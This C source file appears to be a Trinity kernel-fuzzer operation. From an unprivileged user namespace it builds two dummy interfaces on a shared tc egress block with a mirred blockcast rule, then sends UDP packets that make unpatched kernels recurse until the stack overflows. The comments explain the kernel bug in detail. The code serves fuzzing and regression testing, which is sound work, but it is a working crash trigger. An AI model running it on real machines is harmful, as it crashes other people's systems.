/*
 * tc_mirred_blockcast - drive the act_mirred blockcast egress-recursion path.
 *
 * Bug class: tcf_mirred_act() in net/sched/act_mirred.c reads m->tcfm_blockid
 * and, when non-zero, tail-calls tcf_blockcast() BEFORE the
 * sched_mirred_nest++ that gates MIRRED_NEST_LIMIT.  Two dummies sharing a
 * TC egress block with a mirred blockcast rule bounce a single skb
 * A->B->A->... until the task-stack guard page faults.  Reachable from
 * unprivileged code via unshare(CLONE_NEWUSER | CLONE_NEWNET) -- userns
 * CAP_NET_ADMIN is enough for dummies + clsact + shared block + mirred rule.
 * Flat fuzzing can't keep TCA_EGRESS_BLOCK, TCA_MIRRED_BLOCKID, and the
 * TCM_IFINDEX_MAGIC_BLOCK matchall trick coherent across the three rtnl
 * messages needed.
 *
 * Sequence per invocation is a userns_run_in_ns grandchild that creates two
 * dummies, installs clsact roots with a shared TCA_EGRESS_BLOCK index in
 * [0x10, 0xff00] (0/1 are kernel-reserved), attaches a matchall filter on
 * the shared block with a mirred{blockid=<idx>} action, and blasts a small
 * BUDGETED+JITTER UDP burst via SO_BINDTODEVICE on A.  Unpatched kernels
 * stack-overflow; patched kernels cap at MIRRED_NEST_LIMIT=4.
 *
 * Brick-safety: all inside CLONE_NEWNET so no host clsact / shared block is
 * touched; dummies only, no physical device.  BUDGETED+JITTER around base 3,
 * STORM_BUDGET_NS 200 ms wall cap, 12-frame ceiling on the inner send loop,
 * all I/O MSG_DONTWAIT with SO_RCVTIMEO=1s on the rtnl socket.
 *
 * Latches: userns -EPERM latches the op off for the child's life.  Set
 * inside the grandchild: ns_unsupported_dummy on first dummy NEWLINK
 * failure, ns_unsupported_clsact on clsact reject.  Best-effort modprobe of
 * sch_ingress / cls_matchall / act_mirred is one-shot latched so a missing
 * /sbin/modprobe or lockdown=integrity pays the failure once.
 *
 * Header-gated by __has_include() on linux/pkt_sched.h, linux/pkt_cls.h,
 * linux/tc_act/tc_mirred.h.
 */

#if __has_include(<linux/pkt_sched.h>)
#include <linux/pkt_sched.h>
#endif
#if __has_include(<linux/pkt_cls.h>)
#include <linux/pkt_cls.h>
#endif
#if __has_include(<linux/tc_act/tc_mirred.h>)
#include <linux/tc_act/tc_mirred.h>
#endif

#include <errno.h>
#include <net/if.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <sys/socket.h>

#include <linux/if_link.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#include "child.h"
#include "childops-netlink.h"
#include "childops-util.h"
#include "jitter.h"
#include "kernel/if_ether.h"
#include "name-pool.h"
#include "random.h"
#include "shm.h"
#include "trinity.h"
#include "userns-bootstrap.h"

#include "kernel/socket.h"
/*
 * UAPI fallbacks.  Stripped sysroots may not have the full
 * pkt_sched.h / pkt_cls.h / tc_mirred.h; the IDs / values are kernel
 * UAPI and stable.  __has_include() above keeps compilation working;
 * these fill in the names we use.
 */
#ifndef TC_H_ROOT
#define TC_H_ROOT		(0xFFFFFFFFU)
#endif
#ifndef TC_H_CLSACT
#define TC_H_CLSACT		(0xFFFFFFF1U)
#endif
#ifndef TC_H_MAJ_MASK
#define TC_H_MAJ_MASK		(0xFFFF0000U)
#endif
#ifndef TC_H_MIN_MASK
#define TC_H_MIN_MASK		(0x0000FFFFU)
#endif

#ifndef TCA_INGRESS_BLOCK
#define TCA_INGRESS_BLOCK	13
#endif
#ifndef TCA_EGRESS_BLOCK
#define TCA_EGRESS_BLOCK	14
#endif

#ifndef TCA_UNSPEC
#define TCA_UNSPEC		0
#define TCA_KIND		1
#define TCA_OPTIONS		2
#endif

#ifndef RTM_NEWQDISC
#define RTM_NEWQDISC		36
#define RTM_NEWTFILTER		44
#endif

#ifndef TCM_IFINDEX_MAGIC_BLOCK
#define TCM_IFINDEX_MAGIC_BLOCK	(0xFFFFFFFFU)
#endif

/* tc_act/tc_mirred.h eaction values */
#ifndef TCA_EGRESS_REDIR
#define TCA_EGRESS_REDIR	1
#define TCA_EGRESS_MIRROR	2
#endif

/* tca_id action attribute IDs */
#ifndef TCA_ACT_UNSPEC
#define TCA_ACT_UNSPEC		0
#define TCA_ACT_KIND		1
#define TCA_ACT_OPTIONS		2
#endif

/* TCA_MIRRED_* attribute IDs (kernel UAPI; stable). */
#ifndef TCA_MIRRED_UNSPEC
#define TCA_MIRRED_UNSPEC	0
#define TCA_MIRRED_TM		1
#define TCA_MIRRED_PARMS	2
#define TCA_MIRRED_PAD		3
#define TCA_MIRRED_BLOCKID	4
#endif

/* TCA_MATCHALL_* attribute IDs */
#ifndef TCA_MATCHALL_UNSPEC
#define TCA_MATCHALL_UNSPEC	0
#define TCA_MATCHALL_CLASSID	1
#define TCA_MATCHALL_ACT	2
#define TCA_MATCHALL_FLAGS	3
#endif

#ifndef TC_ACT_PIPE
#define TC_ACT_PIPE		3
#define TC_ACT_STOLEN		4
#endif

/*
 * struct tc_mirred fallback.  Layout from include/uapi/linux/
 * tc_act/tc_mirred.h: tc_gen prefix (u32 index, u32 capab, int
 * action, int refcnt, int bindcnt) + int eaction + u32 ifindex.
 * Defined unconditionally as fallback_tc_mirred so the local
 * builder is portable across distros whose tc_mirred.h pulls in
 * incompatible types.  Sized exactly like the kernel struct via
 * explicit field types.
 */
struct fallback_tc_mirred {
	__u32	index;
	__u32	capab;
	int	action;
	int	refcnt;
	int	bindcnt;
	int	eaction;
	__u32	ifindex;
};

#define RTNL_BUF_BYTES		2048

/*
 * Per-iteration burst.  BUDGETED+JITTER scales it.  The bug is
 * single-packet: ONE skb that round-trips through A->B->A is enough
 * to recurse past MIRRED_NEST_LIMIT and walk the stack down.  Keep
 * the burst small so a patched kernel doesn't churn the schedulers
 * for nothing.  STORM_BUDGET_NS clamps wall-clock even if every send
 * is fast.
 */
#define MIRRED_PACKET_BASE	3U
#define MIRRED_PACKET_FLOOR	4U
#define MIRRED_PACKET_CAP	12U
#define STORM_BUDGET_NS		200000000L

#define MIRRED_INNER_PORT	34571

/* Per-grandchild latched gates.  Inherited as false at grandchild
 * fork time (the persistent child never writes them -- the in-ns
 * callback runs exclusively in transient grandchildren) and flipped
 * on the first config-absent rejection from the corresponding
 * subsystem.  Die with the grandchild on _exit(); each subsequent
 * grandchild re-discovers the latch in its own fresh netns.  The
 * EOPNOTSUPP / EAFNOSUPPORT / ENOENT detection arms stay because a
 * fresh user namespace cannot manufacture an absent kernel CONFIG --
 * the gate still short-circuits the rest of the grandchild's
 * iteration once it fires. */
static bool ns_unsupported_rtnl;
static bool ns_unsupported_dummy;
static bool ns_unsupported_clsact;
static bool ns_unsupported_mirred;
static bool ns_unsupported_matchall;
static bool ns_unsupported_inet;
static bool lo_brought_up;
static bool modprobe_tried_ingress;
static bool modprobe_tried_matchall;
static bool modprobe_tried_mirred;

/* Master gate: persistent across iterations in the persistent fuzz
 * child.  Set when userns_run_in_ns() returns -EPERM (hardened userns
 * policy refused CLONE_NEWUSER -- typically user.max_user_namespaces=0
 * or kernel.unprivileged_userns_clone=0) so subsequent invocations
 * short-circuit instead of forking another doomed grandchild. */
static bool ns_setup_failed;

static void warn_once_setup_failed(int err)
{
	static bool warned;

	if (warned)
		return;
	warned = true;
	/* check-static: child-output-ok */
	outputerr("tc_mirred_blockcast: userns_run_in_ns(CLONE_NEWNET) failed (errno=%d), latching ns_setup_failed\n",
		  err);
}

static int build_dummy_create(struct nl_ctx *ctx, const char *name)
{
	unsigned char buf[RTNL_BUF_BYTES];
	struct nlmsghdr *nlh;
	struct ifinfomsg *ifi;
	size_t off, li_off;

	memset(buf, 0, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = RTM_NEWLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
			   NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq   = nl_seq_next(ctx);

	ifi = (struct ifinfomsg *)NLMSG_DATA(nlh);
	ifi->ifi_family = AF_UNSPEC;
	off = NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(*ifi));

	off = nla_put_str(buf, off, sizeof(buf), IFLA_IFNAME, name);
	if (!off)
		return -EIO;

	li_off = off;
	off = nla_nest_start(buf, off, sizeof(buf), IFLA_LINKINFO);
	if (!off)
		return -EIO;
	off = nla_put_str(buf, off, sizeof(buf), IFLA_INFO_KIND, "dummy");
	if (!off)
		return -EIO;
	nla_nest_end(buf, li_off, off);

	nlh->nlmsg_len = (__u32)off;
	return nl_send_recv_retry(ctx, buf, off);
}

/*
 * RTM_NEWQDISC clsact root on (ifindex) with TCA_EGRESS_BLOCK=block.
 * TCA_INGRESS_BLOCK is left unset — the bug runs entirely on the
 * egress path and pinning ingress too would unnecessarily double the
 * block-share surface.  clsact takes no TCA_OPTIONS (the kernel
 * silently ignores them).
 */
static int build_clsact_with_egress_block(struct nl_ctx *ctx, int ifindex,
					  __u32 block_idx)
{
	unsigned char buf[RTNL_BUF_BYTES];
	struct nlmsghdr *nlh;
	struct tcmsg *tcm;
	size_t off;

	memset(buf, 0, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = RTM_NEWQDISC;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
			   NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq   = nl_seq_next(ctx);

	tcm = (struct tcmsg *)NLMSG_DATA(nlh);
	tcm->tcm_family  = AF_UNSPEC;
	tcm->tcm_ifindex = ifindex;
	tcm->tcm_handle  = TC_H_MAJ_MASK;	/* major:0 == clsact handle */
	tcm->tcm_parent  = TC_H_CLSACT;
	tcm->tcm_info    = 0;

	off = NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(*tcm));

	off = nla_put_str(buf, off, sizeof(buf), TCA_KIND, "clsact");
	if (!off)
		return -EIO;

	off = nla_put_u32(buf, off, sizeof(buf), TCA_EGRESS_BLOCK, block_idx);
	if (!off)
		return -EIO;

	nlh->nlmsg_len = (__u32)off;
	return nl_send_recv_retry(ctx, buf, off);
}

/*
 * RTM_NEWTFILTER on the shared block (tcm_ifindex =
 * TCM_IFINDEX_MAGIC_BLOCK, tcm_parent aliased = block_idx).  Filter
 * kind=matchall, single mirred action with TCA_MIRRED_BLOCKID set ==
 * block_idx so the action routes through tcf_blockcast() in the
 * kernel — the path that skips the recursion-counter increment.
 *
 * eaction toggles between EGRESS_REDIR and EGRESS_MIRROR per call so
 * the verdict-handling diff between the two branches gets coverage
 * over time; both branches end up in tcf_blockcast() with non-zero
 * blockid, which is the path the bug lives in.  tc_mirred.parms.ifindex
 * is left at 0: the kernel rejects -EINVAL when both blockid and
 * ifindex are non-zero, so setting an ifindex here would make the
 * filter install fail before the blockcast path ever runs.  With
 * ifindex=0 and TCA_MIRRED_BLOCKID set, the action takes the
 * tcf_blockcast() route.
 */
static int build_mirred_blockcast_filter(struct nl_ctx *ctx, __u32 block_idx,
					 int eaction)
{
	unsigned char buf[RTNL_BUF_BYTES];
	struct nlmsghdr *nlh;
	struct tcmsg *tcm;
	struct fallback_tc_mirred parms;
	size_t off, opts_off, act_off, act1_off, act_opts_off;
	__u32 prio_proto;

	memset(buf, 0, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = RTM_NEWTFILTER;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
			   NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq   = nl_seq_next(ctx);

	tcm = (struct tcmsg *)NLMSG_DATA(nlh);
	tcm->tcm_family  = AF_UNSPEC;
	tcm->tcm_ifindex = (int)TCM_IFINDEX_MAGIC_BLOCK;
	tcm->tcm_handle  = 0;
	tcm->tcm_parent  = block_idx;	/* aliased as tcm_block_index */
	prio_proto = ((__u32)1U << 16) | (__u32)htons(ETH_P_ALL);
	tcm->tcm_info    = prio_proto;

	off = NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(*tcm));

	off = nla_put_str(buf, off, sizeof(buf), TCA_KIND, "matchall");
	if (!off)
		return -EIO;

	opts_off = off;
	off = nla_nest_start(buf, off, sizeof(buf), TCA_OPTIONS);
	if (!off)
		return -EIO;

	/*
	 * TCA_MATCHALL_ACT wraps one or more per-action nests.  Each
	 * per-action nest is keyed by 1-based action index; we only
	 * install one mirred action so index == 1.
	 */
	act_off = off;
	off = nla_nest_start(buf, off, sizeof(buf), TCA_MATCHALL_ACT);
	if (!off)
		return -EIO;

	act1_off = off;
	off = nla_nest_start(buf, off, sizeof(buf), 1);
	if (!off)
		return -EIO;

	off = nla_put_str(buf, off, sizeof(buf), TCA_ACT_KIND, "mirred");
	if (!off)
		return -EIO;

	act_opts_off = off;
	off = nla_nest_start(buf, off, sizeof(buf), TCA_ACT_OPTIONS);
	if (!off)
		return -EIO;

	memset(&parms, 0, sizeof(parms));
	parms.action  = TC_ACT_STOLEN;
	parms.eaction = eaction;
	parms.ifindex = 0;
	off = nla_put(buf, off, sizeof(buf), TCA_MIRRED_PARMS,
		      &parms, sizeof(parms));
	if (!off)
		return -EIO;

	off = nla_put_u32(buf, off, sizeof(buf), TCA_MIRRED_BLOCKID, block_idx);
	if (!off)
		return -EIO;

	nla_nest_end(buf, act_opts_off, off);
	nla_nest_end(buf, act1_off, off);
	nla_nest_end(buf, act_off, off);
	nla_nest_end(buf, opts_off, off);

	nlh->nlmsg_len = (__u32)off;
	return nl_send_recv_retry(ctx, buf, off);
}

static bool is_unsupported_err(int rc)
{
	return rc == -EOPNOTSUPP || rc == -EAFNOSUPPORT ||
	       rc == -EPROTONOSUPPORT || rc == -ENOENT;
}

/*
 * Per-grandchild setup: open rtnl, modprobe the modules clsact /
 * matchall / act_mirred need, bring lo up.  The fresh netns is set up
 * by userns_run_in_ns() before the in-ns callback runs; this helper
 * only has to bring up the rtnl fd and idempotent housekeeping inside
 * it.  Latched failures shut subsequent operations off for this
 * grandchild via the ns_* gates checked at the in-ns callback's entry.
 * Returns 0 on success; nonzero means the caller should bail without
 * entering the cleanup path.
 */
static int tc_mirred_setup_netns(struct nl_ctx *ctx)
{
	struct nl_open_opts nl_opts = {
		.proto = NETLINK_ROUTE,
		.recv_timeo_s = 1,
	};

	if (nl_open(ctx, &nl_opts) < 0) {
		if (errno == EPROTONOSUPPORT || errno == EAFNOSUPPORT)
			ns_unsupported_rtnl = true;
		__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_setup_failed,
				   1, __ATOMIC_RELAXED);
		return -1;
	}

	if (!modprobe_tried_ingress) {
		modprobe_tried_ingress = true;
		try_modprobe("sch_ingress");
	}
	if (!modprobe_tried_matchall) {
		modprobe_tried_matchall = true;
		try_modprobe("cls_matchall");
	}
	if (!modprobe_tried_mirred) {
		modprobe_tried_mirred = true;
		try_modprobe("act_mirred");
	}

	if (!lo_brought_up) {
		rtnl_bring_lo_up(ctx);
		lo_brought_up = true;
	}
	return 0;
}

struct tc_mirred_blockcast_iter_ctx {
	struct childdata *child;
};

/*
 * Per-invocation body that runs inside the grandchild's private
 * netns.  userns_run_in_ns() has already entered the netns; this
 * callback opens rtnl, builds the dummy A/B + clsact + shared-block
 * matchall-mirred topology, drives the egress packet burst that
 * triggers the tcf_blockcast() recursion path, and tears down.  Any
 * resource left behind on a failure path is reaped by the
 * grandchild's _exit() along with the netns.  Return value is ignored
 * by the helper -- per-op stats counters carry the outcome.
 */
static int tc_mirred_blockcast_in_ns(void *arg)
{
	struct tc_mirred_blockcast_iter_ctx *ctx = arg;
	struct childdata *child = ctx->child;
	struct nl_ctx nl = { .fd = -1 };
	char a_name[IFNAMSIZ];
	char b_name[IFNAMSIZ];
	int a_idx = 0, b_idx = 0;
	bool a_added = false, b_added = false;
	__u32 block_idx;
	int udp = -1;
	int rc;
	int eaction;

	if (ns_unsupported_rtnl || ns_unsupported_dummy ||
	    ns_unsupported_clsact || ns_unsupported_matchall ||
	    ns_unsupported_mirred)
		return 0;

	if (tc_mirred_setup_netns(&nl) != 0)
		return 0;

	/* Snapshot child->op_type once and bounds-check before indexing
	 * the per-op stats arrays.  The field lives in shared memory and
	 * can be scribbled by a poisoned-arena write from a sibling; the
	 * child.c dispatch loop already gates its dispatch + alt-op
	 * accounting on the same valid_op snapshot.  Skip the stats
	 * writes entirely when the snapshot is out of range. */
	const enum child_op_type op = child->op_type;
	const bool valid_op = ((int) op >= 0 && op < NR_CHILD_OP_TYPES);

	if (valid_op)
		__atomic_add_fetch(&shm->stats.childop.setup_accepted[op],
				   1, __ATOMIC_RELAXED);

	/* Random suffix per iteration so concurrent children (and our
	 * own cleanup races) don't collide on names. */
	snprintf(a_name, sizeof(a_name), "trmra%u",
		 (unsigned int)(rand32() & 0xffffu));
	snprintf(b_name, sizeof(b_name), "trmrb%u",
		 (unsigned int)(rand32() & 0xffffu));

	rc = build_dummy_create(&nl, a_name);
	if (rc != 0) {
		if (is_unsupported_err(rc))
			ns_unsupported_dummy = true;
		goto out;
	}
	a_added = true;
	a_idx = (int)if_nametoindex(a_name);
	if (a_idx <= 0)
		goto out;

	/* Kernel confirmed a_name now names a real device (the one the
	 * UDP socket below binds via SO_BINDTODEVICE); publish it via the
	 * NETDEV name pool so sibling childops and per-syscall fuzzers
	 * drawing this kind can reference it on subsequent invocations --
	 * reaches bind-success / dev_get_by_name HIT codepaths instead of
	 * always-ENODEV near-miss space.  Record only the primary (A) to
	 * keep the 16-slot per-kind ring from thrashing. */
	name_pool_record(NAME_KIND_NETDEV, a_name, strlen(a_name));

	rc = build_dummy_create(&nl, b_name);
	if (rc != 0) {
		if (is_unsupported_err(rc))
			ns_unsupported_dummy = true;
		goto out;
	}
	b_added = true;
	b_idx = (int)if_nametoindex(b_name);
	if (b_idx <= 0)
		goto out;

	(void)rtnl_setlink_up(&nl, a_idx);
	(void)rtnl_setlink_up(&nl, b_idx);

	/* Block index range: avoid 0 (invalid) and 1 (kernel-reserved
	 * shared-block seed in some configs).  Upper bound keeps us
	 * clear of TCM_IFINDEX_MAGIC_BLOCK's neighbourhood and any
	 * future kernel-reserved range. */
	block_idx = (__u32)(rnd_modulo_u32(0xfef0U) + 0x10U);

	rc = build_clsact_with_egress_block(&nl, a_idx, block_idx);
	if (rc != 0) {
		if (is_unsupported_err(rc))
			ns_unsupported_clsact = true;
		__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_qdisc_fail,
				   1, __ATOMIC_RELAXED);
		goto out;
	}
	__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_qdisc_ok,
			   1, __ATOMIC_RELAXED);

	rc = build_clsact_with_egress_block(&nl, b_idx, block_idx);
	if (rc != 0) {
		if (is_unsupported_err(rc))
			ns_unsupported_clsact = true;
		__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_qdisc_fail,
				   1, __ATOMIC_RELAXED);
		goto out;
	}
	__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_qdisc_ok,
			   1, __ATOMIC_RELAXED);

	eaction = ONE_IN(2) ? TCA_EGRESS_REDIR : TCA_EGRESS_MIRROR;

	rc = build_mirred_blockcast_filter(&nl, block_idx, eaction);
	if (rc != 0) {
		if (is_unsupported_err(rc)) {
			ns_unsupported_matchall = true;
			ns_unsupported_mirred = true;
		}
		__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_filter_fail,
				   1, __ATOMIC_RELAXED);
		goto out;
	}
	__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_filter_ok,
			   1, __ATOMIC_RELAXED);

	if (!ns_unsupported_inet) {
		struct sockaddr_in dst;
		struct timespec t0;
		unsigned int iters, i;

		udp = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
		if (udp < 0) {
			if (errno == EAFNOSUPPORT || errno == EPROTONOSUPPORT)
				ns_unsupported_inet = true;
			goto out;
		}

		(void)setsockopt(udp, SOL_SOCKET, SO_BINDTODEVICE,
				 a_name, strlen(a_name) + 1);

		memset(&dst, 0, sizeof(dst));
		dst.sin_family      = AF_INET;
		dst.sin_port        = htons(MIRRED_INNER_PORT);
		dst.sin_addr.s_addr = htonl(0x7f000001U);	/* 127.0.0.1 */

		(void)clock_gettime(CLOCK_MONOTONIC, &t0);
		iters = BUDGETED(CHILD_OP_TC_MIRRED_BLOCKCAST,
				 JITTER_RANGE(MIRRED_PACKET_BASE));
		if (iters < MIRRED_PACKET_FLOOR)
			iters = MIRRED_PACKET_FLOOR;
		if (iters > MIRRED_PACKET_CAP)
			iters = MIRRED_PACKET_CAP;

		if (valid_op)
			__atomic_add_fetch(&shm->stats.childop.data_path[op],
					   1, __ATOMIC_RELAXED);

		for (i = 0; i < iters; i++) {
			unsigned char payload[64];
			ssize_t n;

			if (ns_since(&t0) >= STORM_BUDGET_NS)
				break;

			generate_rand_bytes(payload, sizeof(payload));
			n = sendto(udp, payload, sizeof(payload),
				   MSG_DONTWAIT,
				   (struct sockaddr *)&dst, sizeof(dst));
			if (n > 0)
				__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_packet_sent_ok,
						   1, __ATOMIC_RELAXED);
		}
	}

out:
	if (udp >= 0)
		close(udp);

	if (nl.fd >= 0) {
		if (a_added && a_idx > 0)
			(void)rtnl_dellink(&nl, a_idx);
		if (b_added && b_idx > 0)
			(void)rtnl_dellink(&nl, b_idx);
		nl_close(&nl);
	}

	return 0;
}

bool tc_mirred_blockcast(struct childdata *child)
{
	struct tc_mirred_blockcast_iter_ctx ctx = { .child = child };
	int rc;
	/* Snapshot child->op_type once and bounds-check before indexing
	 * the per-op latch slot.  The field lives in shared memory and
	 * can be scribbled by a poisoned-arena write from a sibling; the
	 * child.c dispatch loop already gates its dispatch + alt-op
	 * accounting on the same valid_op snapshot.  Skip the latch
	 * store entirely when the snapshot is out of range. */
	const enum child_op_type op = child->op_type;
	const bool valid_op = ((int) op >= 0 && op < NR_CHILD_OP_TYPES);

	__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_runs, 1,
			   __ATOMIC_RELAXED);

	if (ns_setup_failed)
		return true;

	rc = userns_run_in_ns(CLONE_NEWNET, tc_mirred_blockcast_in_ns, &ctx);
	if (rc == -EPERM) {
		ns_setup_failed = true;
		if (valid_op)
			__atomic_store_n(&shm->stats.childop.latch_reason[op],
					 CHILDOP_LATCH_NS_UNSUPPORTED,
					 __ATOMIC_RELAXED);
		__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_setup_failed,
				   1, __ATOMIC_RELAXED);
		warn_once_setup_failed(EPERM);
		return true;
	}
	if (rc < 0) {
		/* Transient grandchild setup failure (fork, id-map write,
		 * secondary unshare).  Skip this iteration without
		 * latching -- the failure is not policy and may not
		 * recur. */
		__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_setup_failed,
				   1, __ATOMIC_RELAXED);
		return true;
	}

	return true;
}
